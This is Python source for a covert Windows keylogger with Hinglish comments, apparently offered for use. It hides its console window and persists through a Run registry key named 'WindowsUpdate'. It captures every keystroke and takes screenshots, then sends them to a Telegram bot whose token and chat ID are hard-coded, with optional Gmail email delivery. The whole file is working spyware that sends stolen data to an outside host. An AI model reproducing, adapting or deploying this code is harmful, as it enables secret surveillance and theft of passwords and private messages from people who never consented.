from pynput import keyboard
import datetime
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
import os
import pyautogui
import requests
import winreg
import sys
import ctypes
import time

class Keylogger:
    def __init__(self):
        self.log = []
        self.is_running = False
        self.listener = None
        
        # 🔥 HIDE CONSOLE WINDOW
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        
        # 🔐 Email settings
        self.email_sender = ""
        self.email_password = ""
        self.email_receiver = ""
        
        # Telegram settings
        self.bot_token = "8524850532:AAGz1VRktruixqvjokhwD_RaVcTC_dK6Lpk"
        self.chat_id = "8441765056"
        
        # 🔥 AUTO-START + SILENT RUN
        self.auto_startup()
        self.start()
    
    def auto_startup(self):
        try:
            exe_path = sys.argv[0]
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
        except:
            pass
        
        # 🔥 AUTO TELEGRAM NOTIFICATION
        self.send_to_telegram("🟢 Keylogger STARTED! (Auto-Run Mode)")
    
    def update_email_settings(self, sender, password, receiver):
        self.email_sender = sender
        self.email_password = password
        self.email_receiver = receiver
        return "✅ Email settings updated!"
    
    def on_press(self, key):
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        try:
            if hasattr(key, 'char') and key.char is not None:
                log_entry = f"{timestamp} - {key.char}"
            else:
                log_entry = f"{timestamp} - [{key}]"
        except:
            log_entry = f"{timestamp} - [Special Key]"
        
        self.log.append(log_entry)
        
        # 🔥 AUTO SEND AFTER EVERY 10 KEYS (BINA ESC PRESS KIYE)
        if len(self.log) >= 10:
            self.send_log_to_telegram()
            self.log = []  # Logs clear karo (duplicate send na ho)
    
    def start(self):
        if not self.is_running:
            self.is_running = True
            self.log = []
            self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
            self.listener.start()
            return "✅ Keylogger started! Press ESC to stop."
        return "⚠️ Keylogger is already running!"
    
    def on_release(self, key):
        if key == keyboard.Key.esc:
            self.stop()
            return False
    
    def stop(self):
        if self.is_running:
            self.is_running = False
            if self.listener:
                self.listener.stop()
            
            self.capture_screenshot()
            email_result = self.send_log_via_email()
            self.send_log_to_telegram()
            self.send_screenshot_to_telegram()
            
            return f"🛑 Keylogger stopped! {email_result} | Logs sent to Telegram!"
        return "⚠️ Keylogger is not running!"
    
    def get_log(self):
        return "\n".join(self.log) if self.log else "No keystrokes recorded yet."
    
    def save_log(self, filename="keylog.txt"):
        with open(filename, "w") as f:
            f.write(f"Keylog Report - {datetime.datetime.now()}\n")
            f.write("=" * 40 + "\n")
            f.write(self.get_log())
        return f"✅ Log saved to {filename}"
    
    # 📸 SCREENSHOT CAPTURE (Compressed)
    def capture_screenshot(self, filename="screenshot.png"):
        try:
            screenshot = pyautogui.screenshot()
            screenshot.save(filename, optimize=True, quality=50)
            return f"✅ Screenshot saved: {filename}"
        except Exception as e:
            return f"❌ Screenshot failed: {str(e)}"
    
    def send_log_via_email(self):
        if not self.email_sender or not self.email_password or not self.email_receiver:
            return "⚠️ Email settings not configured!"
        
        try:
            log_data = self.get_log()
            if log_data == "No keystrokes recorded yet.":
                return "⚠️ No data to send."
            
            subject = f"Keylog Report - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}"
            body = f"""
            Keylogger Report
            =================
            Date: {datetime.datetime.now()}
            Total Keys: {len(self.log)}
            
            Logs:
            {log_data}
            
            Screenshot is attached as screenshot.png
            """
            
            msg = MIMEMultipart()
            msg['From'] = self.email_sender
            msg['To'] = self.email_receiver
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain'))
            
            if os.path.exists("screenshot.png"):
                with open("screenshot.png", "rb") as f:
                    img = MIMEImage(f.read())
                    img.add_header('Content-Disposition', 'attachment', filename="screenshot.png")
                    msg.attach(img)
            
            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login(self.email_sender, self.email_password)
                server.send_message(msg)
            
            return "✅ Email sent successfully!"
        except Exception as e:
            return f"❌ Email failed: {str(e)}"
    
    # 📤 TELEGRAM FUNCTIONS
    def send_to_telegram(self, message):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            payload = {'chat_id': self.chat_id, 'text': message, 'parse_mode': 'HTML'}
            response = requests.post(url, json=payload, timeout=10)
            return response.status_code == 200
        except:
            return False
    
    def send_log_to_telegram(self):
        try:
            log_data = self.get_log()
            if log_data == "No keystrokes recorded yet.":
                self.send_to_telegram("⚠️ No keystrokes recorded.")
                return
            
            if len(log_data) > 4000:
                log_data = log_data[:4000] + "\n... (truncated)"
            
            message = f"""
📋 <b>Keylog Report</b>
=================
📅 {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📊 Total Keys: {len(self.log)}

<b>Logs:</b>
<code>{log_data}</code>
"""
            self.send_to_telegram(message)
        except:
            pass
    
    # 📸 SCREENSHOT SEND (Timeout 30 + Retry 3 Times)
    def send_screenshot_to_telegram(self):
        try:
            if not os.path.exists("screenshot.png"):
                self.send_to_telegram("⚠️ Screenshot not found!")
                return
            
            url = f"https://api.telegram.org/bot{self.bot_token}/sendPhoto"
            
            for i in range(3):
                try:
                    with open("screenshot.png", "rb") as f:
                        files = {'photo': f}
                        data = {'chat_id': self.chat_id}
                        response = requests.post(url, files=files, data=data, timeout=30)
                    
                    if response.status_code == 200:
                        self.send_to_telegram("📸 Screenshot sent successfully!")
                        return
                    else:
                        self.send_to_telegram(f"❌ Attempt {i+1} failed!")
                except Exception as e:
                    self.send_to_telegram(f"❌ Attempt {i+1} timeout: {str(e)}")
                    time.sleep(2)
            
            self.send_to_telegram("❌ Failed to send screenshot after 3 attempts!")
        except Exception as e:
            self.send_to_telegram(f"❌ Screenshot error: {str(e)}")
    
    def test_telegram(self):
        return self.send_to_telegram("✅ Telegram Bot is working!")

# 🔥 MAIN EXECUTION
if __name__ == "__main__":
    keylogger = Keylogger()
    
    try:
        threading.Event().wait()
    except KeyboardInterrupt:
        keylogger.stop()